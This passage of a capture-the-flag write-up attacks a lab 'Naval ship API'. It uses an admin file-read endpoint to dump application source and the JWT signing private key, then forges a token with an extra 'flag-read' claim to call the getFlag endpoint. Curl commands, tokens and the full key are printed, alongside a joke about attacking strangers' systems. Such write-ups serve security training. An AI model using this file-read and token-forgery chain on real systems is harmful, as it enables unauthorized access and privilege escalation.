	"/app/venv/bin/python\u0000/app/venv/bin/uvicorn\u0000--reload\u0000--host\u00000.0.0.0\u0000--workers\u000010\u0000--port\u000080\u0000shipapi.main:app\u0000"

From this we can determine path to application (/app/shipapi/main.py) and cat it: 

	└─$ curl -s -H "Authorization: Bearer eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk4MzYzMzg1LCJpYXQiOjE2OTc2NzIxODUsInN1YiI6IjEiLCJhZG1pbiI6dHJ1ZSwiZ3VpZCI6ImIwZDNkMzQ5LTE1YTMtNGZiNy1hMzdlLWJhZjY0NWY1YmFhMiJ9.nDpeQ-cJaPTb9VQboXeRJCjaUTh6QYoEv0egm4wJUzO7w7YjsBwAgEY2t_TZt4r78HhlN2bY0gxhsfXrXzMdBfJz4isoCC0vEeOqNu2kaBvyIw4brJsRcmy_-aOHB-zJ7nmw-plF7_FSPbena_Apl-saE9YGjHCeGDvObxDVcpahMO07pgF0YvBPLJLYMm-MVP-1GQ5d-KbR9V0emJoRWCjDvhv3CseFZvLabTDze3k6xarrv5Argh9MUJtuEHAjwki6YY6YzVsULhR_YQeyjse5qcf2n97cpsEulgyWfGYpzeDuV1eH3A3w1k__smYnaaVb05W5NQ1MFGxIE1NgnZGEq4vTZstuO4mgZ9yDpkwwRcowCRNWiKY_AsCnAahG7D-Qe0UBMur5yzR8AFTtf13H8mYKLn4Y4DvxOV9eeu2BdzAwGrqwCy9xNxOaTitaj7gVU7BM_M6qwr9x6Jh7vK5aR88Jbn6sBXeCsyXqTjA3pvCXgIlUI1l1BhoSv7Ezv-aRE_j3Bxw8d5vi_xfzZbRtfl1Kn1W67AwAZh2CSnHgCDR5M4MI1q1RSPXX5QOQSJpS052gxg69TnwW_6EoP2TAQqLdsqIYhejFbFbXxa_6EFrssFOWuGmwyrjf1SLNSQ6Ac8DPjyxFdHSJREMeobSZrAuVkcMi2FzrI1zgUGY" -XPOST -H "Content-type: application/json" -d '{"file": "/app/shipapi/main.py"}' http://universal-ship-api.cns-jv.tcc/api/v1/admin/file | jq .file | awk '{gsub(/\\n/,"\n")}1' 
	"import asyncio

	from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
	from fastapi_contrib.common.responses import UJSONResponse
	from fastapi import FastAPI, Depends, HTTPException, status
	from fastapi.security import HTTPBasic, HTTPBasicCredentials
	from fastapi.openapi.docs import get_swagger_ui_html
	from fastapi.openapi.utils import get_openapi

	from typing import Optional, Any
	from pathlib import Path
	from sqlalchemy.orm import Session

	from shipapi.schemas.user import User
	from shipapi.api.v1.api import api_router
	from shipapi.appconfig.config import settings

	from shipapi import deps
	from shipapi import crud

	app = FastAPI(title=\"Naval ship API\", openapi_url=None, docs_url=None, redoc_url=None)
	root_router = APIRouter(default_response_class=UJSONResponse)


	@app.get(\"/\", summary=\" \", status_code=200, include_in_schema=False)
	def root():
	    \"\"\"
	    Root
	    \"\"\"
	    return {\"msg\": \"Naval ship API version 1.0\"}


	@app.get(\"/api\", summary=\"List versions\", status_code=200, include_in_schema=False)
	def list_versions():
	    \"\"\"
	    API versions
	    \"\"\"
	    return {\"endpoints\": [\"v1\"]}


	@app.get(\"/api/v1\", summary=\"List v1 endpoints\", status_code=200, include_in_schema=False)
	def list_endpoints_v1():
	    \"\"\"
	    API v1 Endpoints
	    \"\"\"
	    return {\"endpoints\": [\"user\", \"admin\"]}


	@app.get(\"/docs\", summary=\"Documentation\", include_in_schema=False)
	async def get_documentation(
	        current_user: User = Depends(deps.parse_token)
	):
	    return get_swagger_ui_html(openapi_url=\"/openapi.json\", title=\"Naval ship API docs\")


	@app.get(\"/openapi.json\", include_in_schema=False)
	async def openapi(
	        current_user: User = Depends(deps.parse_token)
	):
	    return get_openapi(title=\"Naval Ship API\", version=\"1.0\", routes=app.routes)


	app.include_router(api_router, prefix=settings.API_V1_STR)
	app.include_router(root_router)


	def start():
	    import uvicorn

	    uvicorn.run(app, host=\"0.0.0.0\", port=80, log_level=\"debug\")


	if __name__ == \"__main__\":
	    import uvicorn

	    uvicorn.run(app, host=\"0.0.0.0\", port=80, log_level=\"debug\")
	"

By reading source code we traverse to file /app/shipapi/api/v1/endpoints/admin.py where is implemented getFlag endpoint:

	@router.put(\"/getFlag\", status_code=200)
	def get_flag(current_user: User = Depends(deps.parse_token)) -> Any:
	    \"\"\"
	    The Flag
	    \"\"\"
	    if not current_user['admin']:
	        return {\"msg\": \"Permission Error\"}

	    if \"flag-read\" not in current_user.keys():
	        raise HTTPException(status_code=400, detail=\"flag-read key missing from JWT\")

	    flag = requests.get('http://flagship:8000').text
	    return {\"Flag\":flag}

So, flag is not on local filesystem, is somewhere in network where we can't reach it. And to get it from API we have to add flag-read key to authentication token. So, let's do it. For this operation I've used https://jwt.io/

Disclaimer: it's not really good idea using web application for parsing or even worse creating authentication tokens. Don't do it in production. But for testing it's ok. Or for stranger's systems :-)

Copy our authentication token there and we will see his content:

	{
	  "type": "access_token",
	  "exp": 1698363385,
	  "iat": 1697672185,
	  "sub": "1",
	  "admin": true,
	  "guid": "b0d3d349-15a3-4fb7-a37e-baf645f5baa2"
	}

So we modify it:

	{
	  "type": "access_token",
	  "exp": 1698363385,
	  "iat": 1697672185,
	  "sub": "1",
	  "admin": true,
	  "flag-read": true,
	  "guid": "b0d3d349-15a3-4fb7-a37e-baf645f5baa2"
	}

and copy-paste back. But we need private key for generation new token. So we look in application config (/app/shipapi/appconfig/config.py) and see thet key in in file `shipapi/appconfig/jwtsigning.key` so get his content:

	-----BEGIN RSA PRIVATE KEY-----
	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
	-----END RSA PRIVATE KEY-----

Copy paste it to jwt.io application and after that copy new authorization token. And now call for flag:

	└─$ curl -H "Authorization: Bearer eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk4MzYzMzg1LCJpYXQiOjE2OTc2NzIxODUsInN1YiI6IjEiLCJhZG1pbiI6dHJ1ZSwiZmxhZy1yZWFkIjp0cnVlLCJndWlkIjoiYjBkM2QzNDktMTVhMy00ZmI3LWEzN2UtYmFmNjQ1ZjViYWEyIn0.TGqeovuobwkuT35JFBix6IjvIPgncfbHZld3EKAwAnIinrvhnocqW1J8b1rKF8Po-GoJKaWlh_bZY_cFsFEG6_x2qeep23406R0JHZe23hfVzSb4y3dKFb6EFjXN7Wvudc69_Z72FpClgCyvaJSKupVVC4DSN9mgMKac_SERtTQ3Sq-1M1MyicsUXMsveDQyqKBasfli0dI_YxqNNlkG5R5Sq9iZgH7B9qTqgFl6tHk0_tKFz7L2LFvmgsdtnYdsWLvD27v9lVQY8u5DNXLYspRglyOn_tIVTZITwiKWjGlyQfe5w12nFvz70f7hD851XMJVirQ2mnlxc0h7ni_QaOIYqySXq-x2xp38Rjfk6Fz5Tkm0Xgz1FdH2iQjbhfMJMr_6KTQZJ-dTTSSgE2xJUQjAz8Wnv-ypzrSb231ZQFoUZpoTQW3b2pOPM2x2W0ZTufdHZlaR5tPPmrMb7MGWtLjGlB_NZv7ulSETqoSzquytPSU_Mhf3wX0d5rukTdETwMGXGoraj9ynColJPGadMpBUaHiSw0A2-Kvw2eX3TzWOQS95QfRZQ2ARRtWfmGd7hAWG1XL4unB6vmIgYiJyQ6qNshwyF-LPVZQnttbBC20wq98yKJBs79hpYTML7CmpjXLajJzLJw2xzoKXveWCOD7d2L7PwmtYSUkW-D3sIhQ" -XPUT http://universal-ship-api.cns-jv.tcc/api/v1/admin/getFlag
	{"Flag":"FLAG{910P-iUeJ-Wwq1-i8L2}"}  